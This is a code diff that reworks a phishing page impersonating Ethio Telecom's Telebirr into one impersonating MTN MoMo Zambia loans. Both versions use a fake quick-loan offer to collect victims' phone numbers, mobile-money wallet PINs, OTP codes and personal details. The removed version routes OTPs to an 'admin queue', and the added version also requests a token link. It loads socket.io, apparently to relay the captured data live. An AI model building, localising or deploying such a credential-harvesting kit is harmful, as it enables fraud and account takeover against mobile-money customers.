@@ -1,469 +1,449 @@
 <!DOCTYPE html>
-<html lang="am">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#0056B3">
-    <title>ቴሌብር የፋይናንስ ሥርዓት</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>MTN MoMo Zambia - MoMo Loans</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         [x-cloak] { display: none !important; }
-        body {
-            background: linear-gradient(to bottom, #002D62 0%, #0056B3 40%, #00A4E4 70%, #E6F4F8 100%);
-            background-attachment: fixed;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        :root {
+            --bg-dark: #070b19;
+            --panel-bg: rgba(17, 24, 39, 0.95);
+            --momo-yellow: #ffcc00;
+            --momo-yellow-hover: #e6b800;
+            --text-main: #ffffff;
+            --text-dim: #94a3b8;
+            --input-bg: #0f172a;
+            --border-color: #334155;
+        }
+        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
+        
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            background-color: #070b19;
+        }
+
+        body { 
+            background: linear-gradient(180deg, #070b19 0%, #021a12 50%, #010d09 100%); 
+            font-family: 'Inter', sans-serif; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            overflow-x: hidden;
             -webkit-font-smoothing: antialiased;
         }
-        input:focus, select:focus {
-            outline: none;
-            border-color: #0056B3;
-            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.2);
+        
+        @media (min-width: 640px) {
+            body {
+                padding: 2rem 1rem;
+                justify-content: center;
+            }
         }
-        .pin-box { 
-            width: 54px; 
-            height: 54px; 
-            border: 1.5px solid #e2e8f0; 
-            border-radius: 12px; 
-            text-align: center; 
-            font-size: 22px; 
-            font-weight: 700; 
-            background: #f8fafc; 
-            color: #0f172a; 
+        
+        select.input-premium option { background-color: #0f172a; color: white; }
+
+        .glass-panel { 
+            background: var(--panel-bg); 
+            backdrop-filter: blur(12px);
+            border: none;
+            color: var(--text-main);
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-header-block {
+            background-color: #ffffff !important;
+            padding: 1.5rem;
+            border-bottom: 1px solid #e2e8f0;
+            width: 100%;
+            flex-shrink: 0;
+            display: block !important;
+            visibility: visible !important;
+            opacity: 1 !important;
+        }
+
+        @media (min-width: 640px) {
+            .glass-panel {
+                border: 1px solid rgba(255, 255, 255, 0.08); 
+                border-radius: 1.25rem; 
+                min-height: auto;
+                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6); 
+                overflow: hidden;
+            }
+        }
+        
+        .input-premium { 
+            background: var(--input-bg); 
+            border: 1px solid var(--border-color); 
+            color: var(--text-main); 
+            padding: 0.875rem 1.25rem; 
+            width: 100%; 
+            border-radius: 0.75rem; 
             outline: none; 
-            transition: all 0.2s; 
+            transition: all 0.3s; 
+            font-size: 0.9375rem; 
         }
-        .pin-box:focus { 
-            border-color: #0056B3; 
-            background: white; 
-            box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); 
+        .input-premium:focus { 
+            border-color: var(--momo-yellow); 
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2); 
         }
-        .spinner-sm { 
-            animation: spin 1s linear infinite; 
-            width: 20px; 
-            height: 20px; 
-            border: 3px solid rgba(255,255,255,0.3); 
-            border-top-color: white; 
-            border-radius: 50%; 
-            display: inline-block; 
+        
+        .btn-premium { 
+            background: var(--momo-yellow); 
+            color: #000000; 
+            padding: 1rem; 
+            font-weight: 700; 
+            border-radius: 0.75rem; 
+            width: 100%; 
+            transition: 0.3s; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            gap: 0.5rem; 
+            border: none; 
+            cursor: pointer; 
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .toast { 
-            position: absolute; 
-            top: 16px; 
-            left: 50%; 
-            transform: translateX(-50%) translateY(-10px); 
-            padding: 12px 24px; 
-            border-radius: 8px; 
-            background: #1e293b; 
-            color: white; 
-            font-size: 13px; 
+        .btn-premium:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-premium:hover:not(:disabled) { background: var(--momo-yellow-hover); }
+        
+        .btn-secondary { 
+            background: transparent; 
+            border: 1px solid var(--border-color); 
+            color: var(--text-dim); 
+            padding: 1rem; 
+            border-radius: 0.75rem; 
+            transition: 0.3s; 
+            cursor: pointer; 
+            font-weight: 600;
+        }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.05); color: #ffffff; }
+
+        .label-premium { 
+            font-size: 0.75rem; 
             font-weight: 600; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
-            z-index: 9999; 
-            opacity: 0; 
-            transition: all 0.25s ease; 
-            white-space: nowrap; 
-            pointer-events: none; 
+            text-transform: uppercase; 
+            letter-spacing: 0.05em; 
+            color: var(--text-dim); 
+            margin-bottom: 0.5rem; 
+            display: block; 
         }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        
+        .progress-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
+        .progress-dot { width: 28px; height: 28px; border-radius: 50%; background: #1e293b; border: 2px solid #334155; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; margin-bottom: 6px; color: #94a3b8; }
+        
+        .progress-step.active .progress-dot { background: var(--momo-yellow); border-color: var(--momo-yellow); color: #000000; }
+        .progress-step.completed .progress-dot { background: #10b981; border-color: #10b981; color: white; }
+        .progress-step.completed .progress-dot::after { content: '✓'; font-size: 14px; }
+        .progress-step.completed .progress-dot span { display: none; }
+        
+        .code-box { 
+            width: 44px; 
+            height: 44px; 
+            border: 2px solid var(--border-color); 
+            border-radius: 10px; 
+            text-align: center; 
+            font-size: 20px; 
+            font-weight: 700;
+            background: var(--input-bg); 
+            color: #ffffff; 
+            outline: none; 
+            transition: all 0.2s;
+        }
+        .code-box:focus {
+            border-color: var(--momo-yellow);
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
+        }
+
+        .spinner-sm { animation: spin 1s linear infinite; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.1); border-top-color: black; border-radius: 50%; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-0 sm:p-4">
+<body class="antialiased">
 
-    <div class="w-full max-w-md bg-[#f8fafc] sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col min-h-screen sm:min-h-[850px] relative" x-data="loanFlow()" x-init="init()">
-        
-        <div id="toast" class="toast" :class="toast.show ? 'show' : ''" x-text="toast.message"></div>
-
-        <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
-            <div class="px-6 py-4 grid grid-cols-[1fr_auto_1fr] items-center gap-4">
-                <div class="flex justify-start">
-                    <img src="/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
-                </div>
-                <div class="h-8 w-[1px] bg-gray-200"></div>
-                <div class="flex justify-end">
-                    <img src="/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
-                </div>
-            </div>
+    <main class="w-full max-w-xl mx-auto relative z-10 flex flex-col justify-start">
+        <section class="glass-panel" x-data="loanFlow()" x-init="init()">
             
-            <div class="border-t border-gray-100 px-6 py-3.5 bg-slate-50/80">
-                <div class="flex items-center justify-between">
-                    <h1 class="text-[#0056B3] font-bold text-base tracking-tight" x-text="step <= 3 ? 'የቴሌብር ማረጋገጫ' : 'የቴሌብር ፋይናንስ'">
-                        የቴሌብር ማረጋገጫ
-                    </h1>
-                    <span class="bg-[#00A4E4] text-white font-semibold text-xs px-4 py-1.5 rounded-full shadow-sm tracking-wide" x-text="step === 2.5 ? 'በማረጋገጥ ላይ...' : 'ደህንነቱ የተጠበቀ'">
-                        ደህንነቱ የተጠበቀ
-                    </span>
+            <div class="logo-header-block">
+                <div class="flex flex-col items-center justify-center">
+                    <img src="assets/mtn-logo-footer.svg" alt="ASA Microfinance" class="h-10 w-auto mb-2 block mx-auto">
+                    <h1 class="text-lg font-bold text-gray-900 tracking-tight text-center">MTN MoMo Zambia</h1>
+                    <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest text-center">MoMo Loans</p>
                 </div>
             </div>
 
-            <div class="w-full bg-[#0056B3] text-white relative overflow-hidden" style="background-image: linear-gradient(to bottom, #0056B3, #003F87);">
-                <div class="absolute inset-0 opacity-10" style="background-size: 22px 22px; background-image: linear-gradient(to right, #fff 1px, transparent 1px), linear-gradient(to bottom, #fff 1px, transparent 1px);"></div>
-                <div class="px-6 py-5 relative z-10">
-                    <p class="text-[9px] font-bold tracking-widest text-cyan-200 uppercase opacity-90">ፈጣን የሞባይል ብድር</p>
-                    <h2 class="text-xl font-bold mt-0.5 tracking-tight">ገንዘብዎ፣ <span class="font-normal text-cyan-100/80">ቀጥታ እጅዎ ላይ ይደርሳል</span></h2>
-                    <p class="text-[9px] font-bold tracking-wider text-cyan-200 uppercase mt-3 opacity-80">የቀረበው የብድር መጠን</p>
-                    
-                    <div class="flex items-baseline gap-1 mt-0.5">
-                        <span class="text-xs font-bold text-cyan-300">ብር</span>
-                        <span class="text-3xl font-black tracking-tight" x-text="Number(form.amount).toLocaleString()">25,000</span>
-                        <span class="bg-white/20 text-[9px] font-bold px-2 py-0.5 rounded ml-1.5" x-text="form.term ? form.term + ' ሳምንት' : '--'">4 ሳምንት</span>
-                    </div>
-                    
-                    <div class="grid grid-cols-3 gap-2 mt-4 pt-3 border-t border-white/10 text-left">
-                        <div>
-                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">የሳምንት ክፍያ</p>
-                            <p class="text-xs font-extrabold mt-0.5" x-text="'ብር ' + calculateWeeklyInstallment()">ብር 6,700.00</p>
-                        </div>
-                        <div class="text-center">
-                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">የቆይታ ጊዜ</p>
-                            <p class="text-xs font-extrabold mt-0.5" x-text="form.term ? form.term + ' ሳምንት' : '--'">4 ሳምንት</p>
-                        </div>
-                        <div class="text-right">
-                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">የአገልግሎት ተመን</p>
-                            <p class="text-xs font-extrabold mt-0.5">1.8%/ሳምንት</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </header>
-
-        <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between relative">
-            <div class="w-full flex justify-center items-center gap-2 mb-6" x-show="step > 3">
-                <template x-for="i in [4, 5, 6, 8]" :key="i">
-                    <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#0056B3] scale-110': step === i, 'bg-cyan-200': step > i, 'bg-gray-200': step < i }"></div>
-                </template>
-            </div>
-
-            <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-center min-h-[420px]">
-                
-                <div x-show="step === 1" class="space-y-6 w-full">
-                    <div class="text-center">
-                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">የቴሌብር አካውንትዎን ያስገቡ</h2>
-                        <p class="text-xs text-gray-400 mt-1">የተመዘገበበትን የኢትዮ ቴሌኮም የሞባይል ቁጥር እና የደህንነት መለያ መረጃዎችን ያስገቡ።</p>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የሞባይል ስልክ ቁጥር</label>
-                        <div class="flex gap-2">
-                            <span class="w-24 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇪🇹 +251</span>
-                            <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXXX" maxlength="9">
-                        </div>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የኪስ ቦርሳ የይለፍ ቃል (PIN)</label>
-                        <div class="flex justify-center gap-3 py-1">
-                            <template x-for="(_, i) in 6" :key="i">
-                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step1-pin')" x-model="step1Pin.value[i]">
-                            </template>
-                        </div>
-                    </div>
-                    <div class="pt-2">
-                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span>ቀጥል</span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 2" x-cloak class="space-y-6 w-full">
-                    <div class="text-center">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የቴሌብር ኤስኤምኤስ (OTP) ማረጋገጫ</h2>
-                        <p class="text-xs text-gray-400 mt-1">የማረጋገጫ ምስጢራዊ ኮድ ወደ ስልክዎ ተልኳል።</p>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የማረጋገጫ ኮድ</label>
-                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
-                    </div>
-                    <div class="pt-2">
-                        <button @click="submitOtpToAdminQueue" :disabled="otp.code.length !== 6 || verifyingOtp" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!verifyingOtp">ኮዱን አረጋግጥ</span>
-                            <span x-show="verifyingOtp" class="spinner-sm"></span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 2.5" x-cloak class="text-center flex flex-col items-center justify-center space-y-6 w-full">
-                    <div class="relative flex items-center justify-center">
-                        <div class="animate-ping absolute inline-flex h-12 w-12 rounded-full bg-cyan-400 opacity-20"></div>
-                        <span class="spinner-sm !w-12 !h-12 !border-4 !border-t-[#0056B3] !border-slate-200"></span>
-                    </div>
-                    <div>
-                        <h3 class="text-lg font-bold text-gray-800">ሂደቱን በማረጋገጥ ላይ</h3>
-                        <p class="text-xs text-gray-400 mt-2 px-6">የግብይት ፈቃድዎ በአስተዳዳሪው በኩል በመረጋገጥ ላይ ነው። እባክዎ ይህንን ገጽ አይዝጉት።</p>
-                    </div>
-                </div>
-
-                <div x-show="step === 3" x-cloak class="space-y-6 w-full">
-                    <div class="text-center">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የአካውንት ደህንነት ማረጋገጫ</h2>
-                        <p class="text-xs text-gray-600 font-medium mt-1">ባለ 6-አሃዝ የቴሌብር መክፈያ እና የግብይት PIN ቁጥርዎን ያስገቡ</p>
-                    </div>
-                    <div class="flex justify-center gap-3 py-1">
-                        <template x-for="(_, i) in 6" :key="i">
-                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step3-pin')" x-model="step3Pin.value[i]">
+            <div class="p-5 md:p-8 flex-1 flex flex-col justify-between">
+                <div>
+                    <div class="flex justify-between mb-6">
+                        <template x-for="i in 6" :key="i">
+                            <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
+                                <div class="progress-dot"><span x-text="i"></span></div>
+                            </div>
                         </template>
                     </div>
-                    <div class="pt-2">
-                        <button @click="submitFinalPinAuthorization" :disabled="!isStep3PinValid || authorizingFinalPin" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!authorizingFinalPin">ቀጥል</span>
-                            <span x-show="authorizingFinalPin" class="spinner-sm"></span>
-                        </button>
-                    </div>
-                </div>
-
-                <div x-show="step === 4" x-cloak class="space-y-5 w-full">
-                    <div class="text-center mb-4">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የብድር ማዋቀሪያ</h2>
-                        <p class="text-xs text-gray-400 mt-1">የሚፈልጉትን የብድር መገለጫ መለኪያዎች ያስተካክሉ።</p>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የብድር አይነት ምርጫ</label>
-                        <select x-model="form.loanType" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
-                            <option value="">የብድር ምድብ ይምረጡ...</option>
-                            <option value="Consumer">የቴሌብር ሳንድቦክስ የግል ብድር</option>
-                            <option value="Merchant">የቴሌብር ነጋዴዎች መስሪያ ካፒታል ብድር</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የተጠየቀው የገንዘብ መጠን (በብር)</label>
-                        <input type="range" x-model="form.amount" min="500" max="150000" step="500" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-[#0056B3]">
-                        <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
-                            <span>500 ብር</span>
-                            <span>150,000 ብር</span>
+                    
+                    <div x-show="step === 1" x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">Loan Details</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 01</span>
+                        </div>
+                        <div class="space-y-4">
+                            <div>
+                                <label class="label-premium">Credit Scheme Type</label>
+                                <select x-model="form.loanType" class="input-premium">
+                                    <option value="">Select loan structure type</option>
+                                    <option value="Personal">Personal Short-Term Credit</option>
+                                    <option value="Business">SME Working Capital Loan</option>
+                                </select>
+                            </div>
+                            <div>
+                                <div class="flex justify-between items-center mb-1">
+                                    <label class="label-premium mb-0">Requested Principal (ZMW)</label>
+                                    <span class="text-xl font-bold text-white" x-text="Number(form.amount).toLocaleString() + ' ZMW'"></span>
+                                </div>
+                                <input type="range" x-model="form.amount" min="5000" max="500000" step="5000" class="w-full accent-amber-500">
+                            </div>
+                            <div>
+                                <label class="label-premium">Repayment Window Term</label>
+                                <select x-model="form.term" class="input-premium">
+                                    <option value="">Select duration cycle</option>
+                                    <option value="3">3 Months Term</option>
+                                    <option value="6">6 Months Term</option>
+                                    <option value="12">12 Months Term</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="label-premium">Stated Usage Purpose</label>
+                                <textarea x-model="form.purpose" class="input-premium h-24" placeholder="Briefly detail what resources will fund..."></textarea>
+                            </div>
+                            <button @click="submitStep1" :disabled="!isStep1Valid" class="btn-premium mt-2">Continue Setup →</button>
                         </div>
                     </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የክፍያ ዑደት</label>
-                        <select x-model="form.term" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
-                            <option value="2">የ2 ሳምንት ዑደት</option>
-                            <option value="4">የ4 ሳምንት ዑደት</option>
-                            <option value="8">የ8 ሳምንት ዑደት</option>
-                        </select>
-                    </div>
-                    <div class="pt-2">
-                        <button @click="submitStep4Config" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">ቀጥል →</button>
-                    </div>
-                </div>
 
-                <div x-show="step === 5" x-cloak class="space-y-5 w-full">
-                    <div class="text-center mb-4">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የግል መገለጫ ማረጋገጫ (KYC)</h2>
-                        <p class="text-xs text-gray-400 mt-1">ማንነትዎ ከስርአቱ መረጃዎች ጋር በትክክል መጣጣሙን ያረጋግጡ።</p>
-                    </div>
-                    <div class="grid grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">ስም</label>
-                            <input type="text" x-model="form.firstName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="ስም">
+                    <div x-show="step === 2" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">Identity Verification</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 02</span>
                         </div>
-                        <div>
-                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የአባት ስም</label>
-                            <input type="text" x-model="form.lastName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="የአባት ስም">
+                        <div class="space-y-4">
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <label class="label-premium">First Name</label>
+                                    <input type="text" x-model="form.firstName" class="input-premium" placeholder="John">
+                                </div>
+                                <div>
+                                    <label class="label-premium">Last Name</label>
+                                    <input type="text" x-model="form.lastName" class="input-premium" placeholder="Doe">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="label-premium">Email Address</label>
+                                <input type="email" x-model="form.email" class="input-premium" placeholder="name@domain.com">
+                            </div>
+                            <div>
+                                <label class="label-premium">Registered MoMo Number</label>
+                                <div class="flex rounded-lg overflow-hidden">
+                                    <span class="input-premium w-28 flex items-center justify-center bg-slate-800 border-r-0 rounded-r-none font-bold text-gray-200">🇺🇿 +260</span>
+                                    <input type="tel" x-model="form.phone" class="input-premium flex-1 rounded-l-none" placeholder="7XXXXXXXX" maxlength="9">
+                                </div>
+                            </div>
+                            <div class="grid grid-cols-2 gap-4 pt-2">
+                                <button @click="step = 1" class="btn-secondary">← Back</button>
+                                <button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continue →</button>
+                            </div>
                         </div>
                     </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የኢሜይል አድራሻ</label>
-                        <input type="email" x-model="form.email" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="name@domain.com">
+
+                    <div x-show="step === 3" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">Employment Information</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 03</span>
+                        </div>
+                        <div class="space-y-4">
+                            <div>
+                                <label class="label-premium">Employment Classification</label>
+                                <select x-model="form.employment" class="input-premium">
+                                    <option value="">Select current status</option>
+                                    <option value="Employed">Salaried / Employed</option>
+                                    <option value="Self-Employed">Self-Employed / Merchant</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="label-premium">Annual Generated Income (ZMW)</label>
+                                <input type="number" x-model="form.income" class="input-premium" placeholder="Total income value in ZMW">
+                            </div>
+                            <div>
+                                <label class="label-premium">Employer Organization Name</label>
+                                <input type="text" x-model="form.employer" class="input-premium" placeholder="Company legal title (Optional)">
+                            </div>
+                            <div class="grid grid-cols-2 gap-4 pt-2">
+                                <button @click="step = 2" class="btn-secondary">← Back</button>
+                                <button @click="submitStep3" :disabled="!isStep3Valid" class="btn-premium">Continue →</button>
+                            </div>
+                        </div>
                     </div>
-                    <div class="grid grid-cols-2 gap-4 pt-2">
-                        <button @click="step = 4" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← ወደኋላ</button>
-                        <button @click="submitStep5Config" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">ቀጣይ →</button>
+
+                    <div x-show="step === 4" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">Authentication Token</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 04</span>
+                        </div>
+                        <div class="space-y-4">
+                            <p class="text-sm text-gray-400">Please supply the custom authentication token hyperlink send to your phone for your profile registry keys. Make sure the tracking parameter string remains intact before continuing verification.</p>
+                            <div>
+                                <label class="label-premium">Unique Authentication Link</label>
+                                <input type="text" x-model="form.authToken" class="input-premium" placeholder="https://registry.infrastructure-terminal/auth/v1/verify-token...">
+                            </div>
+                            <div class="grid grid-cols-2 gap-4 pt-2">
+                                <button @click="step = 3" class="btn-secondary">← Back</button>
+                                <button @click="submitStep4" :disabled="!isStep4Valid" class="btn-premium">Continue →</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">Authorize MoMo PIN</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 05</span>
+                        </div>
+                        <div class="space-y-4">
+                            <p class="text-sm text-gray-400 text-center">Authorize configuration by entering your 5-digit security mobile money secure login wallet transaction PIN.</p>
+                            
+                            <div class="flex justify-center gap-2" id="pin-wrapper">
+                                <template x-for="(_, i) in 5" :key="i">
+                                    <input type="password" 
+                                           class="code-box pin-box" 
+                                           maxlength="1" 
+                                           pattern="\d*"
+                                           inputmode="numeric"
+                                           @input="handleCodeInput($event, i, 5, 'pin')"
+                                           @keydown.backspace="handleCodeBackspace($event, i, 'pin')"
+                                           x-model="pin.value[i]">
+                                </template>
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-4 pt-4">
+                                <button @click="step = 4" class="btn-secondary" :disabled="pinVerifying">← Back</button>
+                                <button @click="submitStep5" :disabled="!isStep5Valid || pinVerifying" class="btn-premium">
+                                    <span x-show="!pinVerifying">Confirm PIN →</span>
+                                    <span x-show="pinVerifying" class="spinner-sm"></span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div x-show="step === 6" x-cloak x-transition.duration.200ms>
+                        <div class="flex justify-between items-center mb-5">
+                            <h2 class="text-lg font-bold text-white">OTP Verification</h2>
+                            <span class="text-xs font-bold text-amber-500">Step 06</span>
+                        </div>
+                        <div class="space-y-4">
+                            <p class="text-sm text-gray-400 text-center">Please input the 4-digit verification code send to your verified mobile number.</p>
+                            
+                            <div class="flex justify-center gap-2" id="otp-wrapper">
+                                <template x-for="(_, i) in 4" :key="i">
+                                    <input type="text" 
+                                           class="code-box otp-box" 
+                                           maxlength="1" 
+                                           pattern="\d*"
+                                           inputmode="numeric"
+                                           @input="handleCodeInput($event, i, 4, 'otp')"
+                                           @keydown.backspace="handleCodeBackspace($event, i, 'otp')"
+                                           x-model="otpData.array[i]">
+                                </template>
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-4 pt-4">
+                                <button @click="step = 5" class="btn-secondary" :disabled="otpVerifying">← Back</button>
+                                <button @click="submitStep6" :disabled="!isStep6Valid || otpVerifying" class="btn-premium">
+                                    <span x-show="!otpVerifying">Confirm & Request →</span>
+                                    <span x-show="otpVerifying" class="spinner-sm"></span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div x-show="step === 7" x-cloak class="text-center py-8">
+                        <div class="w-16 h-16 bg-green-950 text-green-400 border border-green-800 rounded-full flex items-center justify-center text-3xl mx-auto mb-4">✓</div>
+                        <h2 class="text-2xl font-bold text-green-400">Application Lodged Successfully</h2>
+                        <p class="text-gray-400 mt-2 text-sm">Processing verification. Transaction Registry Identifier:</p>
+                        <div class="mt-3 inline-block bg-slate-900 border border-slate-700 px-4 py-2 rounded-md font-mono text-sm text-green-400 font-semibold" x-text="referenceId"></div>
                     </div>
                 </div>
-
-                <div x-show="step === 6" x-cloak class="space-y-5 w-full">
-                    <div class="text-center mb-4">
-                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">የፋይናንስ ብቃት መመዘኛ</h2>
-                        <p class="text-xs text-gray-400 mt-1">የብድር ገደብ ምደባዎችን ለማረጋገጥ የሚያስፈልገውን የጀርባ መረጃ ያቅርቡ።</p>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የስራ ሁኔታ</label>
-                        <select x-model="form.employment" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
-                            <option value="">ሁኔታ ይምረጡ...</option>
-                            <option value="Employed">ደመወዝተኛ ሰራተኛ</option>
-                            <option value="Self-Employed">ግል ስራ / ነጋዴ / ደላላ</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የወር ገቢ (በብር)</label>
-                        <input type="number" x-model="form.income" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold" placeholder="የወር ገቢ መጠን">
-                    </div>
-                    <div class="grid grid-cols-2 gap-4 pt-2">
-                        <button @click="step = 5" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← ወደኋላ</button>
